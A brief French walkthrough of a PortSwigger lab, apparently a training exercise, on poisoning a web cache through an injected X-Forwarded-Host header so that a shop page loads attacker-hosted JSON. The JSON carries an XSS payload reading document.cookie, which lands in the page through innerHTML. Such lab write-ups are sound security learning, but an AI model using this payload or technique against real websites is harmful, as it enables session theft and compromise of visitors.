# Lab

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria

## Payload

Exploit :

```
/resources/json/geolocate.json

HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *

{
    "country": "<img src=x onerror=alert(document.cookie)>"
}
```

Sur la home page on peut injecter le header `X-Forwarded-Host` avec la valeur `exploit-0a42003003e63c5b802425be01450072.exploit-server.net` et elle est utilisée dans la balise script ici :

```html
<script>
    data = {
        "host":"exploit-0a42003003e63c5b802425be01450072.exploit-server.net",
        "path":"/",
    }
</script>
```

Et dans le script situé à `/resources/js/geolocate.js` :

```js
function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');

            let img = document.createElement("img");
            img.setAttribute("src", "/resources/images/localShipping.svg");
            geoLocateContent.appendChild(img)

            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country;
            geoLocateContent.appendChild(div)
        });
}
```

On voit qu'il récupère le resultat de la requête `jsonUrl` et l'injecte dans le DOM avec `j.country` qui est la valeur de `country` dans le JSON.

On peut donc poison le cache pour que la requete `jsonUrl` renvoie notre payload.